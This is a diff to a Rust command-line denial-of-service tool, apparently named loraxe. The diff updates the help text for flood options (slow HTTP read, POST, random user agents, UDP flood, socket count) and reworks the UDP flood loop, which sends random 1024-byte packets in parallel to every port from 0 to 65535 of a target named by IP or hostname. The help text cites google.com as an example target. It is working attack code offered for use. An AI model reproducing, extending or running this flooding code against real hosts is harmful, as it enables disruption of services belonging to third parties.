@@ -22,11 +22,11 @@ use loraxe::*;
 struct Opt {
     // A flag, true if used in the command line. Note doc comment will
     // be used for the help message of the flag.
-    /// Activate ssl mode
+    /// Activate ssl mode (HTTPS)
     #[structopt(long = "ssl")]
     ssl: bool,
 
-    /// Activate post mode
+    /// Activate HTTP post mode
     #[structopt(long = "post")]
     post: bool,
 
@@ -38,11 +38,11 @@ struct Opt {
     #[structopt(short = "r", long = "rand-user-agent")]
     rand_ua: bool,
 
-    /// Enable udp flood mode
+    /// Enable UDP flood mode
     #[structopt(long = "flood", short = "f")]
     flood: bool,
 
-    /// Set number of sockets
+    /// Set number of conncurent sockets
     #[structopt(short = "s", long = "sockets", default_value = "150")]
     sockets: usize,
 
@@ -51,18 +51,18 @@ struct Opt {
     sockets_delay: u64,
 
     #[structopt(short = "b", long = "buffer", default_value = "32")]
-    /// Set read-buffer size
+    /// Set read-buffer size for HTTP Read mode
     read_size: usize,
 
     #[structopt(long = "read")]
-    /// Activate Slow Read mode
+    /// Activate Slow HTTP Read mode
     read: bool,
 
     /// Set port to attack
     #[structopt(short = "p", long = "port", default_value = "80")]
     port: u16,
 
-    /// Files to process
+    /// IP Adress or Hostname to attack (i.e "google.com", "192.168.0.1")
     #[structopt(name = "IP")]
     ip: String,
 }
@@ -124,10 +124,12 @@ fn main() -> Result<(), Box<dyn Error>> {
         loraxe.attack()?;
 
     } else {
+        // UDP Flood mode
+        info!("Starting UDP Flood on {}", &ip);
 
         let mut rng = rand::thread_rng();
 
-        let bytes = (0..1024).into_iter().map(|i| {
+        let bytes = (0..1024).into_iter().map(|_| {
             rng.gen::<u8>()
         }).collect::<Vec<u8>>();
 
@@ -138,15 +140,20 @@ fn main() -> Result<(), Box<dyn Error>> {
             println!("Sending packet");
 
             (0..65535).into_par_iter().for_each(|i: i32|{
-                let mut url = String::with_capacity(ip.len() + i.to_string().len());
+                let mut url = String::with_capacity(ip.len() + i.to_string().len() + 1);
+
                 url.push_str(&ip);
                 url.push_str(":");
                 url.push_str(&i.to_string());
 
                 let sock_addr: SocketAddr = url.to_socket_addrs().unwrap().collect::<Vec<SocketAddr>>()[0];
 
-                // println!("Sending Packet to port {}", i);
-                sock.send_to(&bytes, sock_addr);
+                debug!("Sending Packet to port {}", i);
+
+                sock.send_to(&bytes, sock_addr).unwrap_or_else(|e| {
+                    warn!("Connection failed: {}", e);
+                    0
+                });
             })
         }
     }
